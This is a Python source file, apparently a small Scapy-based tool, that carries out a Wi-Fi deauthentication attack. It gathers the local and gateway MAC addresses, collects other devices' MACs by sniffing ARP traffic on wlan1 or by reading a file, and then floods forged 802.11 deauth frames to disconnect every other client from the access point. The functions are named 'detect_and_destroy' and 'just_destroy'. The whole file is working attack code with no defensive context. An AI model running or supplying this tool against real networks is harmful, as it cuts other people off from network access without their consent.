#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = "Thomas AMORIM"
__credits__ = ["Thomas Amorim", "Pierre-François Bonnefoi" "Scapy"]
__license__ = "MIT"
__version__ = "0.2"
__status__ = "DEV"

from scapy.all import *
import re

list_mac_detected = []
re_ip_gateway = re.compile(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}")
re_mac = re.compile(r"([\w]{2}):([\w]{2}):([\w]{2}):([\w]{2}):([\w]{2}):([\w]{2})")

def scan_packet(t):
	if not ARP in t:
		return
	mac = t[Ether].src
	if not mac in list_mac_detected:
		list_mac_detected.append(mac)
		print "New machine on ",mac

def ip_to_mac(ip):
	p = subprocess.Popen(["arp", "-n", str(ip)], stdout=subprocess.PIPE)
	output, err = p.communicate()
	mac = re_mac.search(output)
	print "Mac from ",ip," : ",mac.group(0)
	return mac.group(0)

def get_infos():
	pifconfig = subprocess.Popen(["ifconfig", "wlan1"], stdout=subprocess.PIPE)
	outputif, errif= pifconfig.communicate()
	mymac = re_mac.search(outputif)
	print "My mac : ",mymac.group(0)
	proute = subprocess.Popen(["ip", "route", "list"], stdout=subprocess.PIPE)
	outputroute, errroute= proute.communicate()
	ip_gateway = re_ip_gateway.search(outputroute)
	print "Gateway IP : ", ip_gateway.group(0)
	return (mymac, str(ip_to_mac(ip_gateway.group(0))), ip_gateway.group(0))

def deauthentification(mac_gateway, mymac, iface):
	for cible in list_mac_detected:
		if not cible == mymac and not cible == mac_gateway:
			for i in range(0,64):
				paquet_from_ap = RadioTap()/Dot11(addr1=cible, addr2 = mac_gateway, addr3 = mac_gateway)/Dot11Deauth()
				paquet_from_client = RadioTap()/Dot11(addr1=mac_gateway, addr2 = cible, addr3 = mac_gateway)/Dot11Deauth()
				#paquet_from_ap.show()
				sendp(paquet_from_ap, iface=iface)
				sendp(paquet_from_client, iface=iface)
			print cible,"expulsed from ",mac_gateway, " !"

def detect_and_destroy(num_max, mymac, mac_gateway, ip_gateway):
	sniff(count=num_max, filter='arp', prn=scan_packet, iface="wlan1")
	#sniff(count=num_max, prn=sniff_devices, iface="wlan1")
	deauthentification(mac_gateway, mymac, "wlan1")

def just_destroy(mymac, mac_gateway, ip_gateway):
	deauthentification(mac_gateway, mymac, "wlan1")

def load_macs(filename, mac_gateway, mymac):
	print mac_gateway
	macs_file = open(filename, "r")
	for line in macs_file:
		line = line.replace("\n","")
		line = line.replace(" ", "")
		if not str(line) == mac_gateway and not str(line) == mymac:
			list_mac_detected.append(line)
			print "New machine on ",line
	macs_file.close()

if __name__ == "__main__":
	isFile=''
	while(isFile != 'y' and isFile != 'n'):
		isFile = raw_input('Do you want to load MAC adresses from file ? (y/n) : ')
	mymac, mac_gateway, ip_gateway = get_infos()
	if isFile=='y':
		load_macs("listofmacs", mac_gateway, mymac)
		just_destroy(mymac, mac_gateway, ip_gateway)
	if isFile=='n':
		detect_and_destroy(50, mymac, mac_gateway, ip_gateway)